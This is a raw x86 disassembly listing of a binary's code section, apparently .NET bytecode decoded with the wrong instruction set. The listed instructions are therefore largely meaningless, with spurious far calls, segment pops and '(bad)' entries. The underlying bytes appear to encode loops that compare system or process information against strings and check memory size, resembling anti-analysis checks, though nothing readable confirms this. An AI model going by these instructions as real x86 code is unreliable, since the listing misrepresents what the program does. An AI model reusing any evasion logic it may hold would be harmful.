  402b65:	17                   	pop    %ss
  402b66:	2a 28                	sub    (%eax),%ch
  402b68:	30 00                	xor    %al,(%eax)
  402b6a:	00 06                	add    %al,(%esi)
  402b6c:	2c 02                	sub    $0x2,%al
  402b6e:	17                   	pop    %ss
  402b6f:	2a 28                	sub    (%eax),%ch
  402b71:	31 00                	xor    %eax,(%eax)
  402b73:	00 06                	add    %al,(%esi)
  402b75:	2c 02                	sub    $0x2,%al
  402b77:	17                   	pop    %ss
  402b78:	2a 16                	sub    (%esi),%dl
  402b7a:	2a 3e                	sub    (%esi),%bh
  402b7c:	28 73 00             	sub    %dh,0x0(%ebx)
  402b7f:	00 0a                	add    %cl,(%edx)
  402b81:	2d 06 28 74 00       	sub    $0x742806,%eax
  402b86:	00 0a                	add    %cl,(%edx)
  402b88:	2a 17                	sub    (%edi),%dl
  402b8a:	2a 00                	sub    (%eax),%al
  402b8c:	1b 30                	sbb    (%eax),%esi
  402b8e:	03 00                	add    (%eax),%eax
  402b90:	56                   	push   %esi
  402b91:	00 00                	add    %al,(%eax)
  402b93:	00 0d 00 00 11 28    	add    %cl,0x28110000
  402b99:	75 00                	jne    0x402b9b
  402b9b:	00 0a                	add    %cl,(%edx)
  402b9d:	0a 16                	or     (%esi),%dl
  402b9f:	0b 2b                	or     (%ebx),%ebp
  402ba1:	3c 06                	cmp    $0x6,%al
  402ba3:	07                   	pop    %es
  402ba4:	9a 0c 73 61 00 00 06 	lcall  $0x600,$0x61730c
  402bab:	0d 09 08 6f 76       	or     $0x766f0809,%eax
  402bb0:	00 00                	add    %al,(%eax)
  402bb2:	0a 6f 77             	or     0x77(%edi),%ch
  402bb5:	00 00                	add    %al,(%eax)
  402bb7:	0a 7d 29             	or     0x29(%ebp),%bh
  402bba:	00 00                	add    %al,(%eax)
  402bbc:	04 7e                	add    $0x7e,%al
  402bbe:	09 00                	or     %eax,(%eax)
  402bc0:	00 04 09             	add    %al,(%ecx,%ecx,1)
  402bc3:	fe 06                	incb   (%esi)
  402bc5:	62 00                	bound  %eax,(%eax)
  402bc7:	00 06                	add    %al,(%esi)
  402bc9:	73 78                	jae    0x402c43
  402bcb:	00 00                	add    %al,(%eax)
  402bcd:	0a 28                	or     (%eax),%ch
  402bcf:	01 00                	add    %eax,(%eax)
  402bd1:	00 2b                	add    %ch,(%ebx)
  402bd3:	2c 05                	sub    $0x5,%al
  402bd5:	17                   	pop    %ss
  402bd6:	13 04 de             	adc    (%esi,%ebx,8),%eax
  402bd9:	11 07                	adc    %eax,(%edi)
  402bdb:	17                   	pop    %ss
  402bdc:	58                   	pop    %eax
  402bdd:	0b 07                	or     (%edi),%eax
  402bdf:	06                   	push   %es
  402be0:	8e 69 32             	mov    0x32(%ecx),%gs
  402be3:	be de 03 26 de       	mov    $0xde2603de,%esi
  402be8:	00 16                	add    %dl,(%esi)
  402bea:	2a 11                	sub    (%ecx),%dl
  402bec:	04 2a                	add    $0x2a,%al
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	01 10                	add    %edx,(%eax)
  402bf2:	00 00                	add    %al,(%eax)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	00 00                	add    %al,(%eax)
  402bf8:	4e                   	dec    %esi
  402bf9:	4e                   	dec    %esi
  402bfa:	00 03                	add    %al,(%ebx)
  402bfc:	13 00                	adc    (%eax),%eax
  402bfe:	00 01                	add    %al,(%ecx)
  402c00:	1b 30                	sbb    (%eax),%esi
  402c02:	03 00                	add    (%eax),%eax
  402c04:	56                   	push   %esi
  402c05:	00 00                	add    %al,(%eax)
  402c07:	00 0e                	add    %cl,(%esi)
  402c09:	00 00                	add    %al,(%eax)
  402c0b:	11 28                	adc    %ebp,(%eax)
  402c0d:	75 00                	jne    0x402c0f
  402c0f:	00 0a                	add    %cl,(%edx)
  402c11:	0a 16                	or     (%esi),%dl
  402c13:	0b 2b                	or     (%ebx),%ebp
  402c15:	3c 06                	cmp    $0x6,%al
  402c17:	07                   	pop    %es
  402c18:	9a 0c 73 63 00 00 06 	lcall  $0x600,$0x63730c
  402c1f:	0d 09 08 6f 76       	or     $0x766f0809,%eax
  402c24:	00 00                	add    %al,(%eax)
  402c26:	0a 6f 77             	or     0x77(%edi),%ch
  402c29:	00 00                	add    %al,(%eax)
  402c2b:	0a 7d 2a             	or     0x2a(%ebp),%bh
  402c2e:	00 00                	add    %al,(%eax)
  402c30:	04 7e                	add    $0x7e,%al
  402c32:	0a 00                	or     (%eax),%al
  402c34:	00 04 09             	add    %al,(%ecx,%ecx,1)
  402c37:	fe 06                	incb   (%esi)
  402c39:	64 00 00             	add    %al,%fs:(%eax)
  402c3c:	06                   	push   %es
  402c3d:	73 78                	jae    0x402cb7
  402c3f:	00 00                	add    %al,(%eax)
  402c41:	0a 28                	or     (%eax),%ch
  402c43:	01 00                	add    %eax,(%eax)
  402c45:	00 2b                	add    %ch,(%ebx)
  402c47:	2c 05                	sub    $0x5,%al
  402c49:	17                   	pop    %ss
  402c4a:	13 04 de             	adc    (%esi,%ebx,8),%eax
  402c4d:	11 07                	adc    %eax,(%edi)
  402c4f:	17                   	pop    %ss
  402c50:	58                   	pop    %eax
  402c51:	0b 07                	or     (%edi),%eax
  402c53:	06                   	push   %es
  402c54:	8e 69 32             	mov    0x32(%ecx),%gs
  402c57:	be de 03 26 de       	mov    $0xde2603de,%esi
  402c5c:	00 16                	add    %dl,(%esi)
  402c5e:	2a 11                	sub    (%ecx),%dl
  402c60:	04 2a                	add    $0x2a,%al
  402c62:	00 00                	add    %al,(%eax)
  402c64:	01 10                	add    %edx,(%eax)
  402c66:	00 00                	add    %al,(%eax)
  402c68:	00 00                	add    %al,(%eax)
  402c6a:	00 00                	add    %al,(%eax)
  402c6c:	4e                   	dec    %esi
  402c6d:	4e                   	dec    %esi
  402c6e:	00 03                	add    %al,(%ebx)
  402c70:	13 00                	adc    (%eax),%eax
  402c72:	00 01                	add    %al,(%ecx)
  402c74:	1b 30                	sbb    (%eax),%esi
  402c76:	03 00                	add    (%eax),%eax
  402c78:	d3 00                	roll   %cl,(%eax)
  402c7a:	00 00                	add    %al,(%eax)
  402c7c:	0f 00 00             	sldt   (%eax)
  402c7f:	11 72 31             	adc    %esi,0x31(%edx)
  402c82:	0b 00                	or     (%eax),%eax
  402c84:	70 73                	jo     0x402cf9
  402c86:	7a 00                	jp     0x402c88
  402c88:	00 0a                	add    %cl,(%edx)
  402c8a:	0a 06                	or     (%esi),%al
  402c8c:	6f                   	outsl  %ds:(%esi),(%dx)
  402c8d:	7b 00                	jnp    0x402c8f
  402c8f:	00 0a                	add    %cl,(%edx)
  402c91:	6f                   	outsl  %ds:(%esi),(%dx)
  402c92:	7c 00                	jl     0x402c94
  402c94:	00 0a                	add    %cl,(%edx)
  402c96:	0b 38                	or     (%eax),%edi
  402c98:	8a 00                	mov    (%eax),%al
  402c9a:	00 00                	add    %al,(%eax)
  402c9c:	07                   	pop    %es
  402c9d:	6f                   	outsl  %ds:(%esi),(%dx)
  402c9e:	7d 00                	jge    0x402ca0
  402ca0:	00 0a                	add    %cl,(%edx)
  402ca2:	0c 73                	or     $0x73,%al
  402ca4:	65 00 00             	add    %al,%gs:(%eax)
  402ca7:	06                   	push   %es
  402ca8:	0d 09 08 72 77       	or     $0x77720809,%eax
  402cad:	0b 00                	or     (%eax),%eax
  402caf:	70 6f                	jo     0x402d20
  402cb1:	7e 00                	jle    0x402cb3
  402cb3:	00 0a                	add    %cl,(%edx)
  402cb5:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402cba:	a2 06 00 70 6f       	mov    %al,0x6f700006
  402cbf:	7f 00                	jg     0x402cc1
  402cc1:	00 0a                	add    %cl,(%edx)
  402cc3:	6f                   	outsl  %ds:(%esi),(%dx)
  402cc4:	77 00                	ja     0x402cc6
  402cc6:	00 0a                	add    %cl,(%edx)
  402cc8:	7d 2b                	jge    0x402cf5
  402cca:	00 00                	add    %al,(%eax)
  402ccc:	04 09                	add    $0x9,%al
  402cce:	08 72 91             	or     %dh,-0x6f(%edx)
  402cd1:	0b 00                	or     (%eax),%eax
  402cd3:	70 6f                	jo     0x402d44
  402cd5:	7e 00                	jle    0x402cd7
  402cd7:	00 0a                	add    %cl,(%edx)
  402cd9:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402cde:	a2 06 00 70 6f       	mov    %al,0x6f700006
  402ce3:	7f 00                	jg     0x402ce5
  402ce5:	00 0a                	add    %cl,(%edx)
  402ce7:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce8:	77 00                	ja     0x402cea
  402cea:	00 0a                	add    %cl,(%edx)
  402cec:	7d 2c                	jge    0x402d1a
  402cee:	00 00                	add    %al,(%eax)
  402cf0:	04 7e                	add    $0x7e,%al
  402cf2:	0b 00                	or     (%eax),%eax
  402cf4:	00 04 09             	add    %al,(%ecx,%ecx,1)
  402cf7:	fe 06                	incb   (%esi)
  402cf9:	66 00 00             	data16 add %al,(%eax)
  402cfc:	06                   	push   %es
  402cfd:	73 78                	jae    0x402d77
  402cff:	00 00                	add    %al,(%eax)
  402d01:	0a 28                	or     (%eax),%ch
  402d03:	01 00                	add    %eax,(%eax)
  402d05:	00 2b                	add    %ch,(%ebx)
  402d07:	2d 18 7e 0c 00       	sub    $0xc7e18,%eax
  402d0c:	00 04 09             	add    %al,(%ecx,%ecx,1)
  402d0f:	fe 06                	incb   (%esi)
  402d11:	67 00 00             	add    %al,(%bx,%si)
  402d14:	06                   	push   %es
  402d15:	73 78                	jae    0x402d8f
  402d17:	00 00                	add    %al,(%eax)
  402d19:	0a 28                	or     (%eax),%ch
  402d1b:	01 00                	add    %eax,(%eax)
  402d1d:	00 2b                	add    %ch,(%ebx)
  402d1f:	2c 05                	sub    $0x5,%al
  402d21:	17                   	pop    %ss
  402d22:	13 04 de             	adc    (%esi,%ebx,8),%eax
  402d25:	2a 07                	sub    (%edi),%al
  402d27:	6f                   	outsl  %ds:(%esi),(%dx)
  402d28:	80 00 00             	addb   $0x0,(%eax)
  402d2b:	0a 3a                	or     (%edx),%bh
  402d2d:	6b ff ff             	imul   $0xffffffff,%edi,%edi
  402d30:	ff                   	lcall  (bad)
  402d31:	de 0a                	fimuls (%edx)
  402d33:	07                   	pop    %es
  402d34:	2c 06                	sub    $0x6,%al
  402d36:	07                   	pop    %es
  402d37:	6f                   	outsl  %ds:(%esi),(%dx)
  402d38:	70 00                	jo     0x402d3a
  402d3a:	00 0a                	add    %cl,(%edx)
  402d3c:	dc de                	(bad)
  402d3e:	0a 06                	or     (%esi),%al
  402d40:	2c 06                	sub    $0x6,%al
  402d42:	06                   	push   %es
  402d43:	6f                   	outsl  %ds:(%esi),(%dx)
  402d44:	70 00                	jo     0x402d46
  402d46:	00 0a                	add    %cl,(%edx)
  402d48:	dc de                	(bad)
  402d4a:	03 26                	add    (%esi),%esp
  402d4c:	de 00                	fiadds (%eax)
  402d4e:	16                   	push   %ss
  402d4f:	2a 11                	sub    (%ecx),%dl
  402d51:	04 2a                	add    $0x2a,%al
  402d53:	00 01                	add    %al,(%ecx)
  402d55:	28 00                	sub    %al,(%eax)
  402d57:	00 02                	add    %al,(%edx)
  402d59:	00 17                	add    %dl,(%edi)
  402d5b:	00 9c b3 00 0a 00 00 	add    %bl,0xa00(%ebx,%esi,4)
  402d62:	00 00                	add    %al,(%eax)
  402d64:	02 00                	add    (%eax),%al
  402d66:	0b 00                	or     (%eax),%eax
  402d68:	b4 bf                	mov    $0xbf,%ah
  402d6a:	00 0a                	add    %cl,(%edx)
	...
  402d74:	cb                   	lret
  402d75:	cb                   	lret
  402d76:	00 03                	add    %al,(%ebx)
  402d78:	13 00                	adc    (%eax),%eax
  402d7a:	00 01                	add    %al,(%ecx)
  402d7c:	1b 30                	sbb    (%eax),%esi
  402d7e:	02 00                	add    (%eax),%al
  402d80:	43                   	inc    %ebx
  402d81:	00 00                	add    %al,(%eax)
  402d83:	00 10                	add    %dl,(%eax)
  402d85:	00 00                	add    %al,(%eax)
  402d87:	11 7e 17             	adc    %edi,0x17(%esi)
  402d8a:	00 00                	add    %al,(%eax)
  402d8c:	0a 72 9d             	or     -0x63(%edx),%dh
  402d8f:	0b 00                	or     (%eax),%eax
  402d91:	70 6f                	jo     0x402e02
  402d93:	81 00 00 0a 0a 06    	addl   $0x60a0a00,(%eax)
  402d99:	2c 1b                	sub    $0x1b,%al
  402d9b:	06                   	push   %es
  402d9c:	72 26                	jb     0x402dc4
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	70 6f                	jo     0x402e11
  402da2:	82 00 00             	addb   $0x0,(%eax)
  402da5:	0a 0b                	or     (%ebx),%cl
  402da7:	07                   	pop    %es
  402da8:	2c 0c                	sub    $0xc,%al
  402daa:	07                   	pop    %es
  402dab:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402dac:	47                   	inc    %edi
  402dad:	00 00                	add    %al,(%eax)
  402daf:	01 2c 04             	add    %ebp,(%esp,%eax,1)
  402db2:	17                   	pop    %ss
  402db3:	0c de                	or     $0xde,%al
  402db5:	13 de                	adc    %esi,%ebx
  402db7:	0a 06                	or     (%esi),%al
  402db9:	2c 06                	sub    $0x6,%al
  402dbb:	06                   	push   %es
  402dbc:	6f                   	outsl  %ds:(%esi),(%dx)
  402dbd:	70 00                	jo     0x402dbf
  402dbf:	00 0a                	add    %cl,(%edx)
  402dc1:	dc de                	(bad)
  402dc3:	03 26                	add    (%esi),%esp
  402dc5:	de 00                	fiadds (%eax)
  402dc7:	16                   	push   %ss
  402dc8:	2a 08                	sub    (%eax),%cl
  402dca:	2a 00                	sub    (%eax),%al
  402dcc:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402dcf:	00 02                	add    %al,(%edx)
  402dd1:	00 10                	add    %dl,(%eax)
  402dd3:	00 20                	add    %ah,(%eax)
  402dd5:	30 00                	xor    %al,(%eax)
  402dd7:	0a 00                	or     (%eax),%al
  402dd9:	00 00                	add    %al,(%eax)
  402ddb:	00 00                	add    %al,(%eax)
  402ddd:	00 00                	add    %al,(%eax)
  402ddf:	00 3c 3c             	add    %bh,(%esp,%edi,1)
  402de2:	00 03                	add    %al,(%ebx)
  402de4:	13 00                	adc    (%eax),%eax
  402de6:	00 01                	add    %al,(%ecx)
  402de8:	1b 30                	sbb    (%eax),%esi
  402dea:	02 00                	add    (%eax),%al
  402dec:	2c 00                	sub    $0x0,%al
  402dee:	00 00                	add    %al,(%eax)
  402df0:	09 00                	or     %eax,(%eax)
  402df2:	00 11                	add    %dl,(%ecx)
  402df4:	28 83 00 00 0a 1f    	sub    %al,0x1f0a0000(%ebx)
  402dfa:	64 28 3a             	sub    %bh,%fs:(%edx)
  402dfd:	00 00                	add    %al,(%eax)
  402dff:	0a 25 6f 84 00 00    	or     0x846f,%ah
  402e05:	0a 6f 85             	or     -0x7b(%edi),%ch
  402e08:	00 00                	add    %al,(%eax)
  402e0a:	0a 20                	or     (%eax),%ah
  402e0c:	96                   	xchg   %eax,%esi
  402e0d:	00 00                	add    %al,(%eax)
  402e0f:	00 6a 31             	add    %ch,0x31(%edx)
  402e12:	04 17                	add    $0x17,%al
  402e14:	0a de                	or     %dh,%bl
  402e16:	07                   	pop    %es
  402e17:	de 03                	fiadds (%ebx)
  402e19:	26 de 00             	fiadds %es:(%eax)
  402e1c:	16                   	push   %ss
  402e1d:	2a 06                	sub    (%esi),%al
  402e1f:	2a 01                	sub    (%ecx),%al
  402e21:	10 00                	adc    %al,(%eax)
  402e23:	00 00                	add    %al,(%eax)
  402e25:	00 00                	add    %al,(%eax)
  402e27:	00 25 25 00 03 13    	add    %ah,0x13030025
  402e2d:	00 00                	add    %al,(%eax)
  402e2f:	01 1b                	add    %ebx,(%ebx)
  402e31:	30 05 00 9a 00 00    	xor    %al,0x9a00
  402e37:	00 11                	add    %dl,(%ecx)
  402e39:	00 00                	add    %al,(%eax)
  402e3b:	11 28                	adc    %ebp,(%eax)
  402e3d:	86 00                	xchg   %al,(%eax)
  402e3f:	00 0a                	add    %cl,(%edx)
  402e41:	0a 16                	or     (%esi),%dl
  402e43:	0b 2b                	or     (%ebx),%ebp
  402e45:	7d 06                	jge    0x402e4d
  402e47:	07                   	pop    %es
  402e48:	9a 0c 73 5e 00 00 06 	lcall  $0x600,$0x5e730c
  402e4f:	0d 09 08 6f 87       	or     $0x876f0809,%eax
  402e54:	00 00                	add    %al,(%eax)
  402e56:	0a 6f 7f             	or     0x7f(%edi),%ch
  402e59:	00 00                	add    %al,(%eax)
  402e5b:	0a 7d 27             	or     0x27(%ebp),%bh
  402e5e:	00 00                	add    %al,(%eax)
  402e60:	04 09                	add    $0x9,%al
  402e62:	7b 27                	jnp    0x402e8b
  402e64:	00 00                	add    %al,(%eax)
  402e66:	04 28                	add    $0x28,%al
  402e68:	5f                   	pop    %edi
  402e69:	00 00                	add    %al,(%eax)
  402e6b:	0a 2d 51 09 72 36    	or     0x36720951,%ch
  402e71:	0c 00                	or     $0x0,%al
  402e73:	70 16                	jo     0x402e8b
  402e75:	09 7b 27             	or     %edi,0x27(%ebx)
  402e78:	00 00                	add    %al,(%eax)
  402e7a:	04 6f                	add    $0x6f,%al
  402e7c:	41                   	inc    %ecx
  402e7d:	00 00                	add    %al,(%eax)
  402e7f:	0a 18                	or     (%eax),%bl
  402e81:	5b                   	pop    %ebx
  402e82:	28 88 00 00 0a 09    	sub    %cl,0x90a0000(%eax)
  402e88:	fe 06                	incb   (%esi)
  402e8a:	5f                   	pop    %edi
  402e8b:	00 00                	add    %al,(%eax)
  402e8d:	06                   	push   %es
  402e8e:	73 89                	jae    0x402e19
  402e90:	00 00                	add    %al,(%eax)
  402e92:	0a 28                	or     (%eax),%ch
  402e94:	02 00                	add    (%eax),%al
  402e96:	00 2b                	add    %ch,(%ebx)
  402e98:	28 8b 00 00 0a 7d    	sub    %cl,0x7d0a0000(%ebx)
  402e9e:	28 00                	sub    %al,(%eax)
  402ea0:	00 04 7e             	add    %al,(%esi,%edi,2)
  402ea3:	0d 00 00 04 09       	or     $0x9040000,%eax
  402ea8:	fe 06                	incb   (%esi)
  402eaa:	60                   	pusha
  402eab:	00 00                	add    %al,(%eax)
  402ead:	06                   	push   %es
  402eae:	73 78                	jae    0x402f28
  402eb0:	00 00                	add    %al,(%eax)
  402eb2:	0a 28                	or     (%eax),%ch
  402eb4:	01 00                	add    %eax,(%eax)
  402eb6:	00 2b                	add    %ch,(%ebx)
  402eb8:	2c 05                	sub    $0x5,%al
  402eba:	17                   	pop    %ss
  402ebb:	13 04 de             	adc    (%esi,%ebx,8),%eax
  402ebe:	14 07                	adc    $0x7,%al
  402ec0:	17                   	pop    %ss
  402ec1:	58                   	pop    %eax
  402ec2:	0b 07                	or     (%edi),%eax
  402ec4:	06                   	push   %es
  402ec5:	8e 69 3f             	mov    0x3f(%ecx),%gs
  402ec8:	7a ff                	jp     0x402ec9
  402eca:	ff                   	(bad)
  402ecb:	ff                   	lcall  (bad)
  402ecc:	de 03                	fiadds (%ebx)
  402ece:	26 de 00             	fiadds %es:(%eax)
  402ed1:	16                   	push   %ss
  402ed2:	2a 11                	sub    (%ecx),%dl
  402ed4:	04 2a                	add    $0x2a,%al
  402ed6:	00 00                	add    %al,(%eax)
  402ed8:	01 10                	add    %edx,(%eax)
  402eda:	00 00                	add    %al,(%eax)
  402edc:	00 00                	add    %al,(%eax)
  402ede:	00 00                	add    %al,(%eax)
  402ee0:	92                   	xchg   %eax,%edx
  402ee1:	92                   	xchg   %eax,%edx
  402ee2:	00 03                	add    %al,(%ebx)
  402ee4:	13 00                	adc    (%eax),%eax
  402ee6:	00 01                	add    %al,(%ecx)
  402ee8:	1b 30                	sbb    (%eax),%esi
  402eea:	03 00                	add    (%eax),%eax
  402eec:	13 01                	adc    (%ecx),%eax
  402eee:	00 00                	add    %al,(%eax)
  402ef0:	12 00                	adc    (%eax),%al
  402ef2:	00 11                	add    %dl,(%ecx)
  402ef4:	72 3a                	jb     0x402f30
  402ef6:	0c 00                	or     $0x0,%al
  402ef8:	70 73                	jo     0x402f6d
  402efa:	7a 00                	jp     0x402efc
  402efc:	00 0a                	add    %cl,(%edx)
  402efe:	0a 06                	or     (%esi),%al
  402f00:	6f                   	outsl  %ds:(%esi),(%dx)
  402f01:	7b 00                	jnp    0x402f03
  402f03:	00 0a                	add    %cl,(%edx)
  402f05:	6f                   	outsl  %ds:(%esi),(%dx)
  402f06:	7c 00                	jl     0x402f08
  402f08:	00 0a                	add    %cl,(%edx)
  402f0a:	0b 38                	or     (%eax),%edi
  402f0c:	ca 00 00             	lret   $0x0
  402f0f:	00 07                	add    %al,(%edi)
  402f11:	6f                   	outsl  %ds:(%esi),(%dx)
  402f12:	7d 00                	jge    0x402f14
  402f14:	00 0a                	add    %cl,(%edx)
  402f16:	25 72 95 08 00       	and    $0x89572,%eax
  402f1b:	70 6f                	jo     0x402f8c
  402f1d:	7e 00                	jle    0x402f1f
  402f1f:	00 0a                	add    %cl,(%edx)
  402f21:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402f26:	a2 06 00 70 6f       	mov    %al,0x6f700006
  402f2b:	7f 00                	jg     0x402f2d
  402f2d:	00 0a                	add    %cl,(%edx)
  402f2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402f30:	77 00                	ja     0x402f32
  402f32:	00 0a                	add    %cl,(%edx)
  402f34:	0c 72                	or     $0x72,%al
  402f36:	76 0c                	jbe    0x402f44
  402f38:	00 70 6f             	add    %dh,0x6f(%eax)
  402f3b:	7e 00                	jle    0x402f3d
  402f3d:	00 0a                	add    %cl,(%edx)
  402f3f:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402f44:	a2 06 00 70 6f       	mov    %al,0x6f700006
  402f49:	7f 00                	jg     0x402f4b
  402f4b:	00 0a                	add    %cl,(%edx)
  402f4d:	6f                   	outsl  %ds:(%esi),(%dx)
  402f4e:	77 00                	ja     0x402f50
  402f50:	00 0a                	add    %cl,(%edx)
  402f52:	0d 08 72 8e 0c       	or     $0xc8e7208,%eax
  402f57:	00 70 6f             	add    %dh,0x6f(%eax)
  402f5a:	8c 00                	mov    %es,(%eax)
  402f5c:	00 0a                	add    %cl,(%edx)
  402f5e:	2d 75 09 72 8e       	sub    $0x8e720975,%eax
  402f63:	0c 00                	or     $0x0,%al
  402f65:	70 6f                	jo     0x402fd6
  402f67:	8c 00                	mov    %es,(%eax)
  402f69:	00 0a                	add    %cl,(%edx)
  402f6b:	2d 68 08 72 9e       	sub    $0x9e720868,%eax
  402f70:	0c 00                	or     $0x0,%al
  402f72:	70 6f                	jo     0x402fe3
  402f74:	8c 00                	mov    %es,(%eax)
  402f76:	00 0a                	add    %cl,(%edx)
  402f78:	2d 5b 09 72 9e       	sub    $0x9e72095b,%eax
  402f7d:	0c 00                	or     $0x0,%al
  402f7f:	70 6f                	jo     0x402ff0
  402f81:	8c 00                	mov    %es,(%eax)
  402f83:	00 0a                	add    %cl,(%edx)
  402f85:	2d 4e 08 72 ac       	sub    $0xac72084e,%eax
  402f8a:	0c 00                	or     $0x0,%al
  402f8c:	70 6f                	jo     0x402ffd
  402f8e:	8c 00                	mov    %es,(%eax)
  402f90:	00 0a                	add    %cl,(%edx)
  402f92:	2d 41 09 72 ac       	sub    $0xac720941,%eax
  402f97:	0c 00                	or     $0x0,%al
  402f99:	70 6f                	jo     0x40300a
  402f9b:	8c 00                	mov    %es,(%eax)
  402f9d:	00 0a                	add    %cl,(%edx)
  402f9f:	2d 34 08 72 b6       	sub    $0xb6720834,%eax
  402fa4:	0c 00                	or     $0x0,%al
  402fa6:	70 6f                	jo     0x403017
  402fa8:	8c 00                	mov    %es,(%eax)
  402faa:	00 0a                	add    %cl,(%edx)
  402fac:	2d 27 09 72 b6       	sub    $0xb6720927,%eax
  402fb1:	0c 00                	or     $0x0,%al
  402fb3:	70 6f                	jo     0x403024
  402fb5:	8c 00                	mov    %es,(%eax)
  402fb7:	00 0a                	add    %cl,(%edx)
  402fb9:	2d 1a 08 72 c6       	sub    $0xc672081a,%eax
  402fbe:	0c 00                	or     $0x0,%al
  402fc0:	70 6f                	jo     0x403031
  402fc2:	8c 00                	mov    %es,(%eax)
  402fc4:	00 0a                	add    %cl,(%edx)
  402fc6:	2d 0d 09 72 c6       	sub    $0xc672090d,%eax
  402fcb:	0c 00                	or     $0x0,%al
  402fcd:	70 6f                	jo     0x40303e
  402fcf:	8c 00                	mov    %es,(%eax)
  402fd1:	00 0a                	add    %cl,(%edx)
  402fd3:	2c 05                	sub    $0x5,%al
  402fd5:	17                   	pop    %ss
  402fd6:	13 04 de             	adc    (%esi,%ebx,8),%eax
  402fd9:	2a 07                	sub    (%edi),%al
  402fdb:	6f                   	outsl  %ds:(%esi),(%dx)
  402fdc:	80 00 00             	addb   $0x0,(%eax)
  402fdf:	0a 3a                	or     (%edx),%bh
  402fe1:	2b ff                	sub    %edi,%edi
  402fe3:	ff                   	(bad)
  402fe4:	ff                   	lcall  (bad)
  402fe5:	de 0a                	fimuls (%edx)
  402fe7:	07                   	pop    %es
  402fe8:	2c 06                	sub    $0x6,%al
  402fea:	07                   	pop    %es
  402feb:	6f                   	outsl  %ds:(%esi),(%dx)
  402fec:	70 00                	jo     0x402fee
  402fee:	00 0a                	add    %cl,(%edx)
  402ff0:	dc de                	(bad)
  402ff2:	0a 06                	or     (%esi),%al
  402ff4:	2c 06                	sub    $0x6,%al
  402ff6:	06                   	push   %es
  402ff7:	6f                   	outsl  %ds:(%esi),(%dx)
  402ff8:	70 00                	jo     0x402ffa
  402ffa:	00 0a                	add    %cl,(%edx)
  402ffc:	dc de                	(bad)
  402ffe:	03 26                	add    (%esi),%esp
  403000:	de 00                	fiadds (%eax)
  403002:	16                   	push   %ss
  403003:	2a 11                	sub    (%ecx),%dl
  403005:	04 2a                	add    $0x2a,%al
  403007:	00 41 4c             	add    %al,0x4c(%ecx)
  40300a:	00 00                	add    %al,(%eax)
  40300c:	02 00                	add    (%eax),%al
  40300e:	00 00                	add    %al,(%eax)
  403010:	17                   	pop    %ss
  403011:	00 00                	add    %al,(%eax)
  403013:	00 dc                	add    %bl,%ah
  403015:	00 00                	add    %al,(%eax)
  403017:	00 f3                	add    %dh,%bl
  403019:	00 00                	add    %al,(%eax)
  40301b:	00 0a                	add    %cl,(%edx)
  40301d:	00 00                	add    %al,(%eax)
  40301f:	00 00                	add    %al,(%eax)
  403021:	00 00                	add    %al,(%eax)
  403023:	00 02                	add    %al,(%edx)
  403025:	00 00                	add    %al,(%eax)
  403027:	00 0b                	add    %cl,(%ebx)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 f4                	add    %dh,%ah
  40302d:	00 00                	add    %al,(%eax)
  40302f:	00 ff                	add    %bh,%bh
  403031:	00 00                	add    %al,(%eax)
  403033:	00 0a                	add    %cl,(%edx)
	...
  403041:	00 00                	add    %al,(%eax)
  403043:	00 0b                	add    %cl,(%ebx)
  403045:	01 00                	add    %eax,(%eax)
  403047:	00 0b                	add    %cl,(%ebx)
  403049:	01 00                	add    %eax,(%eax)
  40304b:	00 03                	add    %al,(%ebx)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	00 13                	add    %dl,(%ebx)
  403051:	00 00                	add    %al,(%eax)
  403053:	01 1b                	add    %ebx,(%ebx)
  403055:	30 02                	xor    %al,(%edx)
  403057:	00 bb 00 00 00 13    	add    %bh,0x13000000(%ebx)
  40305d:	00 00                	add    %al,(%eax)
  40305f:	11 72 d0             	adc    %esi,-0x30(%edx)
  403062:	0c 00                	or     $0x0,%al
  403064:	70 73                	jo     0x4030d9
  403066:	7a 00                	jp     0x403068
  403068:	00 0a                	add    %cl,(%edx)
  40306a:	0a 06                	or     (%esi),%al
  40306c:	6f                   	outsl  %ds:(%esi),(%dx)
  40306d:	7b 00                	jnp    0x40306f
  40306f:	00 0a                	add    %cl,(%edx)
  403071:	6f                   	outsl  %ds:(%esi),(%dx)
  403072:	7c 00                	jl     0x403074
  403074:	00 0a                	add    %cl,(%edx)
  403076:	0b 2b                	or     (%ebx),%ebp
  403078:	24 07                	and    $0x7,%al
  40307a:	6f                   	outsl  %ds:(%esi),(%dx)
  40307b:	7d 00                	jge    0x40307d
  40307d:	00 0a                	add    %cl,(%edx)
  40307f:	72 3a                	jb     0x4030bb
  403081:	0d 00 70 6f 7e       	or     $0x7e6f7000,%eax
  403086:	00 00                	add    %al,(%eax)
  403088:	0a 28                	or     (%eax),%ch
  40308a:	8d 00                	lea    (%eax),%eax
  40308c:	00 0a                	add    %cl,(%edx)
  40308e:	20 00                	and    %al,(%eax)
  403090:	00 00                	add    %al,(%eax)
  403092:	40                   	inc    %eax
  403093:	6a 5c                	push   $0x5c
  403095:	1a 6a 34             	sbb    0x34(%edx),%ch
  403098:	04 17                	add    $0x17,%al
  40309a:	0c de                	or     $0xde,%al
  40309c:	7c 07                	jl     0x4030a5
  40309e:	6f                   	outsl  %ds:(%esi),(%dx)
  40309f:	80 00 00             	addb   $0x0,(%eax)
  4030a2:	0a 2d d4 de 0a 07    	or     0x70aded4,%ch
  4030a8:	2c 06                	sub    $0x6,%al
  4030aa:	07                   	pop    %es
  4030ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4030ac:	70 00                	jo     0x4030ae
  4030ae:	00 0a                	add    %cl,(%edx)
  4030b0:	dc de                	(bad)
  4030b2:	0a 06                	or     (%esi),%al
  4030b4:	2c 06                	sub    $0x6,%al
  4030b6:	06                   	push   %es
  4030b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4030b8:	70 00                	jo     0x4030ba
  4030ba:	00 0a                	add    %cl,(%edx)
  4030bc:	dc 72 62             	fdivl  0x62(%edx)
  4030bf:	0d 00 70 73 7a       	or     $0x7a737000,%eax
